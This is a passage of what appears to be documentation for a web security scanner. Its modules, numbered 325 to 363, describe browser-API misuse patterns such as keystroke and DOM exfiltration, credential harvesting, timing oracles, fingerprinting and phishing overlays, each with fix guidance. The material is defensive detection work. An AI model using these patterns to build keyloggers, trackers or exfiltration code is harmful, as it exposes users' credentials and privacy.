**References:** [↗](https://html.spec.whatwg.org/multipage/interaction.html#the-inert-attribute) · [↗](https://cwe.mitre.org/data/definitions/1021.html)

---

### 325. Anchor Positioning Security
**Module:** `anchor_positioning_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

CSS Anchor Positioning misuse — anchor-name/position-anchor set from URL parameter (layout injection), anchor() positions overlay near password/payment fields (phishing overlay attack), CSS positioning injected via setAttribute/style.cssText, anchor-name sourced from cookies/localStorage.

**How to fix:**
- Never set CSS anchor-name or position-anchor properties from URL parameters or user input
- Audit anchor() usages that position elements near sensitive UI elements (login/payment fields)
- Do not inject anchor-name or position-anchor via setAttribute with user-controlled values
- Implement CSP style-src to restrict CSS injection vectors

**References:** [↗](https://drafts.csswg.org/css-anchor-position-1/) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 326. Drag Drop Security
**Module:** `drag_drop_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Drag and Drop API misuse — dataTransfer.getData() content transmitted externally, sensitive credentials set as draggable data, dropped files automatically uploaded to remote server.

**How to fix:**
- Validate drag-and-drop data content before transmitting — never auto-exfiltrate drag data
- Do not set auth tokens, passwords, or API keys as dataTransfer drag data
- Require explicit user confirmation before uploading dropped files to servers
- Implement CSP to restrict file upload fetch/XHR destinations

**References:** [↗](https://html.spec.whatwg.org/multipage/dnd.html) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 327. Input Event Security
**Module:** `input_event_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

event.key/code/data transmitted via fetch/sendBeacon: real-time JavaScript keylogger exfiltrates individual keystrokes Keystroke sequence on password/auth/credential field exfiltrated: sensitive field keylogging captures credentials beforeinput preventDefault/stopPropagation: keystroke interception can redirect user input to attacker-controlled handler InputEvent/beforeinput configuration from URL parameter: attacker-controlled input event simulation

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/InputEvent) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 328. Mutation Observer Security
**Module:** `mutation_observer_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

MutationObserver used for DOM surveillance — input/textarea/password value monitored and exfiltrated (DOM keylogger), password/token fields watched for credential harvest, full document observed with subtree:true, addedNodes content exfiltrated.

**How to fix:**
- Never monitor input/password field mutations and transmit values to remote endpoints
- Limit MutationObserver scope — avoid observing entire document with subtree:true for analytics purposes
- Do not transmit MutationObserver addedNodes content to external servers
- Implement Content-Security-Policy to restrict fetch/beacon destinations

**References:** [↗](https://dom.spec.whatwg.org/#mutation-observers) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 329. Resource Timing Security
**Module:** `resource_timing_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-208**

Resource Timing API misuse — PerformanceResourceTiming duration/transferSize exfiltrated to remote (network timing side-channel), timing correlated with auth/login endpoints (timing oracle for credential probing), full resource list enumerated and transmitted (page request inventory disclosure).

**How to fix:**
- Do not transmit PerformanceResourceTiming data to remote analytics or tracking endpoints
- Avoid correlating resource timing with authentication/login endpoint responses
- Do not enumerate and transmit performance.getEntries() to external servers
- Deploy Timing-Allow-Origin headers carefully and limit cross-origin timing exposure

**References:** [↗](https://w3c.github.io/resource-timing/) · [↗](https://cwe.mitre.org/data/definitions/208.html)

---

### 330. Document Domain Security
**Module:** `document_domain_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

document.domain manipulation — domain set from URL parameter (attacker-controlled same-origin relaxation), document.domain relaxation weakens cross-subdomain isolation, domain changed followed by data exfiltration, Origin-Agent-Cluster disabled allowing document.domain mutation.

**How to fix:**
- Avoid setting document.domain — use postMessage for cross-subdomain communication instead
- Never set document.domain from URL parameters or user-controlled input
- Enable Origin-Agent-Cluster by serving the Origin-Agent-Cluster: ?1 header
- Audit all usages of document.domain for potential subdomain isolation weakening

**References:** [↗](https://html.spec.whatwg.org/multipage/origin.html#relaxing-the-same-origin-restriction) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

### 331. Document Fragment / Range API Security
**Module:** `document_fragment_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

createContextualFragment() parses HTML from URL parameter: Range API used as XSS injection vector bypassing standard sanitization range.insertNode() inserts URL parameter content: attacker-controlled DOM insertion at arbitrary document positions range.extractContents() transmitted via fetch/sendBeacon: DOM subtree exfiltration via Range extraction API range.cloneContents() sent to analytics: DOM content surveillance via cloning of document ranges

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Range) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 332. History Api Security
**Module:** `history_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

History API misuse — pushState URL sourced from URL parameter enables URL spoofing for phishing, external URL pushed to history bar (address bar phishing technique), sensitive auth/token data stored in history state object.

**How to fix:**
- Validate history.pushState/replaceState URL arguments — never accept raw URL param values
- Only push same-origin URLs to history — reject external URL schemes
- Never store auth tokens, session data, or passwords in history.pushState state objects
- Implement server-side URL validation for any URL used in history manipulation

**References:** [↗](https://html.spec.whatwg.org/multipage/history.html) · [↗](https://cwe.mitre.org/data/definitions/601.html)

---

### 333. Font Access API Security (Local Font Fingerprinting)
**Module:** `font_access_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Local font list transmitted for fingerprinting: installed fonts create persistent cross-site device identifier queryLocalFonts() with no filter: complete font inventory enumerated to maximise fingerprinting entropy FontData list exfiltrated to remote endpoint: full installed font set sent to attacker-controlled server queryLocalFonts() filter from URL parameter: attacker probes for specific fonts to infer installed software

**References:** [↗](https://wicg.github.io/local-font-access/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 334. Shape Detection API Biometric / Surveillance
**Module:** `shape_detection_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Facial biometric exfiltration: FaceDetector bounding boxes/landmarks transmitted to remote — facial geometry data sent to attacker server (biometric surveillance) Barcode content exfiltration: BarcodeDetector rawValue transmitted — QR/barcode content (which may contain auth tokens, URLs, sensitive data) sent to server OCR text exfiltration: TextDetector rawValue transmitted — text extracted from images sent to remote without user consent Camera stream surveillance: detection running on getUserMedia stream — real-time video analyzed for faces/barcodes without clear user notification Continuous scan loop: detection in requestAnimationFrame/setInterval — ongoing automated scanning without any user-initiated trigger

**How to fix:**
- Never transmit FaceDetector results (bounding boxes, landmarks) to any remote endpoint — facial geometry is biometric data
- Display detected barcode/QR content to the user locally — do not relay rawValue to external servers
- Obtain explicit informed consent before running face or text detection on live camera streams
- Avoid setInterval/requestAnimationFrame detection loops — trigger detection only on explicit user action
- Implement strict CSP to prevent unauthorized script access to Shape Detection API results

**References:** [↗](https://wicg.github.io/shape-detection-api/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Barcode_Detection_API)

---

### 335. Focus Management Security
**Module:** `focus_management_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-693**

Programmatic focus() on password/auth/card/SSN field: auto-focus draws user to sensitive input without consent tabIndex=-1/0 combined with iframe/overlay/modal: focus trapping locks user within attacker-controlled UI document.activeElement exfiltrated to remote endpoint: focused element reveals user interaction and navigation patterns tabIndex value sourced from URL parameter: attacker-controlled keyboard navigation order enables tab-jacking

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/focus) · [↗](https://cwe.mitre.org/data/definitions/693.html)

---

### 336. CSS Scroll Snap / Scroll Position Security
**Module:** `scroll_snap_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

scrollY/scrollTop position transmitted to remote analytics: continuous scroll behaviour used for user surveillance scrollIntoView() targets password/auth/token element: sensitive form fields programmatically revealed to viewport scroll-snap properties injected via insertRule/innerHTML: dynamic scroll snap manipulation via DOM injection scroll-snap-type controlled by URL parameter: attacker-controlled scroll snapping behaviour applied to page

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scroll_snap) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 337. Scroll Timeline Security
**Module:** `scroll_timeline_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Scroll Timeline API misuse — ScrollTimeline currentTime/progress transmitted to remote (user scroll position surveillance), scroll state correlated with auth/login context, ViewTimeline offset data exfiltrated, scroll timeline target configured from URL parameter.

**How to fix:**
- Do not transmit ScrollTimeline currentTime or progress values to remote analytics
- Avoid correlating scroll position state with authentication or session events
- Never configure ScrollTimeline/ViewTimeline targets from URL parameters
- Audit ViewTimeline usage for element visibility data being transmitted to third parties

**References:** [↗](https://drafts.csswg.org/scroll-animations-1/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 338. View Transition API Snapshot / Content Capture
**Module:** `view_transition_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Sensitive content snapshot: startViewTransition callback renders sensitive data (tokens/auth) — captured in transition screenshot shared with GPU/compositor Transition name from URL param: view-transition-name derived from URL parameter — attacker forces specific elements to be captured in animation frame Snapshot exfiltrated: transition snapshot captured via toDataURL/toBlob and transmitted — visual page screenshot sent to attacker server Cross-document content leak: cross-document view transitions capture content from the incoming page — information from the navigation target leaked in animation Element capture via CSS injection: style.setProperty('view-transition-name') from URL param — attacker controls which element's visual snapshot is used in transition

**How to fix:**
- Clear sensitive content (auth tokens, form values) before calling startViewTransition
- Never derive view-transition-name from URL parameters, hash, or searchParams
- Do not call toDataURL/toBlob or make network requests inside startViewTransition callbacks
- Audit cross-document view transitions — ensure incoming page content doesn't expose sensitive paths in transition animations
- Restrict @view-transition rule to explicitly opted-in page pairs using allow: same-origin only

**References:** [↗](https://www.w3.org/TR/css-view-transitions-1/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Document/startViewTransition)

---

### 339. Content Visibility API Security
**Module:** `content_visibility_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

contentvisibilityautostatechange + performance.now() transmitted: rendering skip state used as cross-origin timing oracle content-visibility property from URL parameter: attacker controls which elements are skipped from rendering contentVisibility skip/hidden state transmitted remotely: rendering pipeline state exfiltrated as covert channel contain-intrinsic-size characteristics transmitted for fingerprinting: rendering geometry used as device identifier

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 340. Pointer Events Security
**Module:** `pointer_events_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

pointermove events transmitted to analytics: continuous pointer coordinate stream leaks user movement and interaction patterns Pointer hardware attributes (pressure/tilt/pointerType) fingerprinted: stylus/touch device characteristics used for cross-site fingerprinting setPointerCapture() followed by remote data exfil: captured pointer events from entire viewport exfiltrated PointerEvent configuration from URL parameter: attacker-controlled pointer event simulation parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Pointer_events) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 341. EventTarget / CustomEvent Security
**Module:** `event_target_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

new CustomEvent() carries password/token/secret in detail payload: sensitive data transmitted via DOM event dispatch to listeners CustomEvent dispatched with URL parameter payload: attacker-controlled event detail injected into DOM event system addEventListener handler transmits credentials via fetch/sendBeacon: event listener used as data exfiltration trigger window.addEventListener for message/storage/focus/blur events transmits to remote: global browser event surveillance

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 342. Error Event Security
**Module:** `error_event_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-209**

error.stack transmitted via fetch/sendBeacon: stack traces reveal internal file paths, function names, and code structure to attackers window.onerror handler transmits all uncaught errors to remote: complete error context including URLs and line numbers exfiltrated new Error()/throw includes password/token/credential in message: sensitive data embedded in error messages that may be logged or transmitted error.message transmitted to analytics: internal API responses and error details leaked to third-party analytics

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/ErrorEvent) · [↗](https://cwe.mitre.org/data/definitions/209.html)

---

### 343. IntersectionObserver Behavioral Tracking
**Module:** `intersection_observer_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Invisible pixel tracking: 1x1px element fires network request when user scrolls to it — records page attention without cookies Scroll depth/attention transmitted: isIntersecting events sent to server build behavioral profile of reading habits Third-party analytics visibility: viewability events sent to ad/analytics providers — persistent user behavior profiling Form interaction tracking: observing form fields reveals which fields user saw, even before filling them Threshold:0 invisible elements: zero-threshold observer fires for any pixel of any element entering viewport — aggressive tracking

**How to fix:**
- Disclose all scroll tracking and viewability measurement to users in privacy policy
- Avoid transmitting raw intersection data to third parties — aggregate server-side with minimal PII
- Never track form field visibility — this reveals user intent before submission and may violate privacy regulations
- Use threshold values appropriate to genuine viewability measurement (0.5+ for meaningful view) not surveillance
- Implement a consent mechanism before starting IntersectionObserver tracking

**References:** [↗](https://w3c.github.io/IntersectionObserver/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API)

---

### 344. Performance Timing Side-Channel
**Module:** `performance_observer_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-208**

Resource timing oracle: timing differences in cross-origin resource fetches reveal if user is authenticated on other sites Navigation timing leakage: domComplete/loadEventEnd expose backend rendering time, revealing server load and caching state Timing data shared with analytics: load times sent to third-party reveal network speed, ISP, and device performance Fine-grained performance.now() around fetch: timing oracle distinguishes 401 vs 200 responses in under 1ms transferSize enumeration: resource sizes reveal content even without reading body (cross-origin size oracle)

**How to fix:**
- Implement Timing-Allow-Origin headers only for resources where cross-origin timing disclosure is acceptable
- Restrict Resource Timing API via Permissions Policy: 'timing-allow-origins' to limit which origins can measure
- Never transmit raw timing measurements to third-party analytics — derive only aggregate metrics server-side
- Add artificial timing noise in server responses for authenticated resources to defeat timing oracles
- Review use of performance.now() around authentication-related network calls

**References:** [↗](https://w3c.github.io/resource-timing/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Performance_API)

---

### 345. Reporting Observer Security
**Module:** `reporting_observer_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

ReportingObserver misuse — browser intervention/deprecation reports exfiltrated externally, feature-policy-violation reports transmitted for policy probing, deprecation events used for browser version fingerprinting.

**How to fix:**
- Do not transmit ReportingObserver reports to remote analytics servers
- Avoid using ReportingObserver to detect browser feature-policy-violations (security policy probing)
- Do not use deprecation reports for browser fingerprinting
- If using ReportingObserver for monitoring, ensure reports stay within same-origin infrastructure

**References:** [↗](https://www.w3.org/TR/reporting/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 346. Long Task Observer CPU Timing Side-Channel
**Module:** `longtask_observer_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-385**

Task timing exfiltrated: long task duration/startTime transmitted to remote — CPU load timing data leaked enabling hardware profiling Attribution disclosed cross-origin: task containerSrc/containerName transmitted — which cross-origin frame caused CPU contention disclosed to attacker Crypto timing oracle: long task timing correlated with encryption operations — timing side-channel enables brute-force of key material or algorithm detection CPU fingerprinting: task duration patterns correlated with device/CPU profile — hardware performance characteristics exfiltrated via task timing Cross-origin computation inference: iframe-attributed long tasks reveal computation in embedded cross-origin content — privacy boundary bypass

**How to fix:**
- Do not transmit long task duration or startTime values to analytics or external endpoints
- Never correlate long task timing with cryptographic operations and transmit results externally
- Avoid transmitting task attribution (containerSrc, containerName) to remote endpoints — cross-origin privacy leak
- Implement process isolation (COOP, COEP, CORP) to limit cross-origin long task attribution visibility
- Use Permissions-Policy to restrict PerformanceObserver usage to trusted origins if possible

**References:** [↗](https://w3c.github.io/longtasks/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)

---

### 347. Long Animation Frame Security
**Module:** `long_animation_frame_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-208**

Long Animation Frame (LoAF) API misuse — LoAF timing data exfiltrated to remote (performance side-channel), timing correlated with keydown/input events (keystroke timing inference via animation jitter), script attribution URLs transmitted (internal code structure disclosure).

**How to fix:**
- Do not transmit LoAF timing entries to remote analytics endpoints
- Avoid correlating long animation frame timing with user input or authentication events
- Do not transmit LoAF script attribution (sourceURL/invokerType) to external servers
- Use buffered: false for PerformanceObserver to limit historical data collection

**References:** [↗](https://w3c.github.io/long-animation-frames/) · [↗](https://cwe.mitre.org/data/definitions/208.html)

---

### 348. Element Timing API Layout Fingerprinting
**Module:** `element_timing_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Render time exfiltrated: element renderTime/loadTime transmitted to analytics — precise layout timing leaked (pixel-perfect layout fingerprinting) Auth oracle via element timing: avatar/profile image render time correlated with login state — detect whether user is authenticated via image load timing Content inference: element render time correlated with src/url identifier — content type or caching status inferred from timing Bulk observer exfiltration: PerformanceObserver 'element' entries bulk-transmitted to remote — complete element render timeline sent to attacker Cross-origin timing probe: element timing used with cross-origin assets — probe which third-party resources a user has cached (browsing history inference)

**How to fix:**
- Do not transmit element render timing (renderTime, loadTime, startTime) to analytics or remote endpoints
- Avoid correlating element render time with authentication state or user identity
- Restrict cross-origin element timing by ensuring CORP/COEP headers are set on embedded resources
- Audit PerformanceObserver 'element' entries — do not bulk-send them to external endpoints
- Consider using Timing-Allow-Origin carefully — only expose timing for resources that cannot be used as side-channels

**References:** [↗](https://wicg.github.io/element-timing/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceElementTiming)

---

### 349. Document Visibility API Tab Surveillance
**Module:** `document_visibility_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Visibility state exfiltrated: visibilitychange transmits document.visibilityState to analytics — user tab-switching behaviour sent to remote server Focus timing tracked: time-in-focus calculated via performance.now on visibilitychange and transmitted — precise user attention duration exfiltrated Payment flow detection: visibilitychange correlated with payment/checkout state — payment process timing and interruption monitored Away time exfiltrated: total time tab was hidden (awayTime) calculated and transmitted — user absence from page tracked and sent to analytics State not cleared on hide: sensitive variables remain accessible when tab is hidden — data exposed during BFCache or multi-tab access

**How to fix:**
- Do not transmit visibilityState or document.hidden values to analytics platforms
- Do not measure and transmit time-in-focus or time-away metrics to remote endpoints without explicit user consent
- Avoid correlating page visibility with payment or checkout flows in transmitted telemetry
- Clear sensitive data (tokens, form values) when document becomes hidden — do not just pause timers
- Implement privacy budget controls if using visibility API alongside other timing/fingerprinting APIs

**References:** [↗](https://www.w3.org/TR/page-visibility-2/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Document/visibilityState)

---

### 350. TreeWalker / NodeIterator Security
**Module:** `tree_walker_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

createTreeWalker() filtering for password/auth/credential nodes: DOM traversal targets sensitive elements for content extraction TreeWalker/NodeIterator nextNode() result transmitted via fetch/analytics: DOM text content exfiltrated via tree traversal API createTreeWalker() on full document with NodeFilter.SHOW_ALL: entire DOM tree traversal captures all text and attribute nodes createTreeWalker() parameters from URL parameter: attacker-controlled DOM traversal filter and root selection

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/TreeWalker) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 351. Navigation API URL Tracking / Open Redirect
**Module:** `navigation_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-601**

URL tracking: destination URL transmitted to analytics on every navigation — complete user journey tracking URL param open redirect: navigate event handler redirects based on URL parameter — attacker crafts link to redirect victim All navigations intercepted: overbroad intercept suppresses browser back-button and security navigation behaviours URL bar spoofing: transitionWhile modifying document.title/location during navigation — phishing via URL bar deception History traversal injection: traverseTo() with URL param enables attacker to navigate victim's history

**How to fix:**
- Never transmit navigation destination URLs to analytics or third-party endpoints without explicit user consent
- Validate all navigate-based redirects against an allowlist — never use raw URL parameter as navigation target
- Limit navigation event interception to specific route patterns — avoid catch-all intercept
- Validate that transitionWhile handlers do not modify document.title or location to mislead users
- Sanitize traverseTo() arguments — never use user-provided strings as navigation history keys

**References:** [↗](https://wicg.github.io/navigation-api/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Navigation_API)

---

### 352. Text Fragment Security
**Module:** `text_fragment_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Text Fragment (:~:text=) misuse — scroll oracle via IntersectionObserver timing, link injection from URL parameter enables highlight injection, highlighted text content exfiltrated, timing-based text presence detection.

**How to fix:**
- Do not construct :~:text= URLs from user-supplied input without sanitization
- Avoid using IntersectionObserver to detect text fragment scroll position and transmitting results
- Do not exfiltrate highlighted text content to remote endpoints
- Implement Content-Security-Policy to limit fetch/beacon destinations

**References:** [↗](https://wicg.github.io/scroll-to-text-fragment/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 353. Font Loading API Fingerprinting / SSRF
**Module:** `font_loading_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Font timing oracle: document.fonts.check() timing via performance.now reveals which local fonts are installed — precision device fingerprinting Font data exfiltration: font availability or family list sent to remote endpoint — user font fingerprint cross-site tracking FontFace src from URL parameter: attacker controls font fetch target — SSRF probe or CSP font-src bypass data: URI font from URL param: base64-encoded font injected via URL — bypasses font-src CSP directive @font-face SSRF probe: absolute external URL in CSS font-src performs GET request to attacker server — SSRF via stylesheet injection

**How to fix:**
- Never derive FontFace source URL from URL parameters — restrict font sources to a hardcoded list
- Add font-src CSP directive to restrict which origins can serve fonts
- Avoid transmitting font availability or timing data to analytics endpoints
- Restrict @font-face src to same-origin or explicitly trusted CDNs
- Use font-display: optional to reduce timing side-channels from font loading

**References:** [↗](https://www.w3.org/TR/css-font-loading-3/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/FontFace)

---

### 354. Scheduler API Data Exfiltration / Task Abuse
**Module:** `scheduler_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-311**

Task data exfiltration: postTask callback reads localStorage/cookies and transmits to remote — sensitive data sent via scheduled task evading monitoring Credentials in task payload: apiKey/authToken/password referenced inside postTask callback — credential exposure in scheduled background task Timing oracle: postTask completion time measured and transmitted — timing side-channel revealing computation or auth state TaskController abort from URL param: attacker triggers controller.abort() via URL parameter — legitimate user tasks cancelled by malicious link Priority manipulation from URL param: task priority set from URL parameter — attacker boosts malicious tasks or starves legitimate ones

**How to fix:**
- Never read localStorage, sessionStorage, or cookies inside postTask callbacks that transmit data externally
- Avoid including credential variable names (apiKey, authToken) directly in postTask callback scope
- Do not measure postTask timing via performance.now and send to external endpoints
- Derive TaskController.abort() triggers only from internal application state, never from URL parameters
- Hardcode task priorities — never allow user-supplied input to influence task scheduling priority

**References:** [↗](https://wicg.github.io/scheduling-apis/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Scheduler/postTask)

---

### 355. ResizeObserver Layout Fingerprinting
**Module:** `resize_observer_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-359**

Dimensions transmitted: element size data sent to analytics reveals viewport, font, and zoom settings — passive fingerprinting Bulk observe across many elements: reconstructs complete layout tree dimensions for precise device fingerprinting Cross-origin iframe dimension probing: ResizeObserver on embedded iframes can leak cross-origin content dimensions No disconnect: ResizeObserver left running permanently enables continuous passive monitoring of layout changes Analytics combined with dimensions: width/height data piped to gtag/mixpanel builds persistent cross-session device profile

**How to fix:**
- Avoid transmitting element dimensions to analytics endpoints — review what layout data is genuinely needed
- Call ro.disconnect() when the observation is no longer needed (component unmount, page hide)
- Do not observe cross-origin iframe elements — this may constitute cross-origin information leakage
- Limit ResizeObserver to the specific elements that need responsive behaviour; avoid bulk querySelectorAll patterns
- Aggregate or round dimensions before any server-side transmission to limit fingerprinting precision

**References:** [↗](https://www.w3.org/TR/resize-observer/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver)

---

### 356. User Timing Data Leakage / XS-Leak
**Module:** `user_timing_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-203**

Sensitive mark names: marks like 'user-checkout-complete' reveal user flow and feature usage to anyone with DevTools or reading the Performance API Duration to analytics: measure() durations piped to analytics expose user behaviour timing and device capability fingerprinting Cross-origin timing probe: performance.mark around cross-origin loads probes whether resources exist (XS-Leak via timing oracle) Performance entry exfiltration: getEntries() results transmitted to server reveal complete navigation and resource timing Device performance fingerprinting: duration variances fingerprint CPU speed, memory, and device class

**How to fix:**
- Use opaque mark names that do not reveal business logic (e.g., 'phase-1' not 'user-login-complete')
- Never transmit performance.measure() durations to analytics without explicit user consent
- Be aware that cross-origin resource timing can be used as an XS-Leak vector — use Timing-Allow-Origin carefully
- Restrict what DevTools exposes via mark names in production builds
- Aggregate and round timing values server-side; do not expose raw millisecond precision to third parties

**References:** [↗](https://www.w3.org/TR/user-timing/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Performance/mark)

---

## Privacy & Fingerprinting

*11 scanners in this category.*

### 357. PHI (Protected Health Information) Exposed in API
**Module:** `phi_exposure` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359**

SSN/social security number pattern in API response: identity theft, fraud, regulatory violation Date of birth exposed unauthenticated: enables account takeover, identity verification bypass Diagnosis/ICD codes returned: health condition disclosure, insurance discrimination, HIPAA violation Medication/prescription data exposed: enables targeted social engineering, HIPAA breach FHIR Patient resource accessible without auth: full healthcare record exposure, regulatory fines Medical record number (MRN) disclosed: enables record linkage attacks across healthcare systems

**How to fix:**
- Require strong authentication (OAuth2/OIDC) for all PHI-adjacent endpoints
- Implement field-level access control — return only fields the authenticated user is authorized for
- Encrypt PHI at rest and in transit with FIPS 140-2 validated algorithms
- Implement audit logging for all PHI access (who accessed what and when)
- Conduct HIPAA Security Rule assessment; engage compliance officer before deployment
- Apply data minimization — return minimum necessary PHI per HIPAA minimum necessary standard

**References:** [↗](https://www.hhs.gov/hipaa/for-professionals/security/index.html)

---

### 358. Topics Api Security
**Module:** `topics_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Topics API misuse — browsing interest profile exfiltrated to remote analytics, topics stored persistently in localStorage, topics combined with PII linking interest categories to real user identity.

**How to fix:**
- Do not transmit document.browsingTopics() results to remote analytics servers
- Avoid storing browsing topics in localStorage, cookies, or IndexedDB
- Never combine Topics API data with PII (email, userId) in the same request
- Review Topics API usage against GDPR/CCPA consent requirements

**References:** [↗](https://patcg-individual-drafts.github.io/topics/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 359. Attribution Reporting Security
**Module:** `attribution_reporting_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Attribution Reporting API misuse — PII (email/userId) embedded in ad source registration, cross-origin attribution destination sends conversion data to third parties, filterData used for user identification.

**How to fix:**
- Never include PII (email, userId, phone) in Attribution Reporting source registrations
- Restrict attributionDestination to same-origin or explicitly trusted first-party domains
- Use opaque filterData — avoid embedding user identifiers that could re-identify users
- Audit Attribution Reporting headers with privacy review before deployment

**References:** [↗](https://wicg.github.io/attribution-reporting-api/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 360. Private Aggregation Security
**Module:** `private_aggregation_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Private Aggregation API misuse — PII embedded in histogram bucket keys enables user re-identification, enableDebugMode bypasses differential privacy noise guarantees, bucket key from URL param enables attacker-controlled histogram manipulation.

**How to fix:**
- Use only opaque, non-identifying values as Private Aggregation bucket keys
- Never call privateAggregation.enableDebugMode() in production environments
- Hardcode bucket key values — never derive from URL parameters or user input
- Conduct privacy review before deploying Private Aggregation API worklets

**References:** [↗](https://patcg-individual-drafts.github.io/private-aggregation-api/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 361. Interest Group Security
**Module:** `interest_group_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Protected Audience/FLEDGE misuse — PII embedded in interest group membership (user identification in ad targeting), biddingLogicURL from URL param enables script injection, auction results exfiltrated.

**How to fix:**
- Never use PII (email, userId) as interest group names — use opaque identifiers
- Hardcode biddingLogicURL — never derive from URL parameters or user input
- Do not transmit runAdAuction() results to external analytics endpoints
- Conduct privacy review before deploying Protected Audience API on production

**References:** [↗](https://wicg.github.io/turtledove/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 362. Shared Storage Security
**Module:** `shared_storage_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Shared Storage API misuse — PII/credentials written enabling cross-site exposure, selectURL selection oracle for cross-site profiling, value from URL param enables injection, cross-site read and exfiltration.

**How to fix:**
- Never store PII, credentials, or tokens in Shared Storage — it's a cross-site data store
- Do not transmit selectURL results to external endpoints
- Validate all values written to Shared Storage — never source directly from URL parameters
- Implement server-side controls and audit Shared Storage worklet operations regularly

**References:** [↗](https://wicg.github.io/shared-storage/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 363. Fenced Frame Security
**Module:** `fenced_frame_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-668**

Fenced Frame isolation bypass attempts — URL from URL param loads attacker content, reportEvent leaks PII, postMessage/parent communication attempts break isolation, cookie/storage access in fenced context.

**How to fix:**
- Hardcode Fenced Frame URLs — never derive src or config from URL parameters
- Only include non-sensitive event data in fence.reportEvent() calls
- Do not attempt parent communication (postMessage, window.parent) from Fenced Frame context
- Avoid accessing document.cookie or localStorage from within Fenced Frames

**References:** [↗](https://wicg.github.io/fenced-frame/) · [↗](https://cwe.mitre.org/data/definitions/668.html)

---

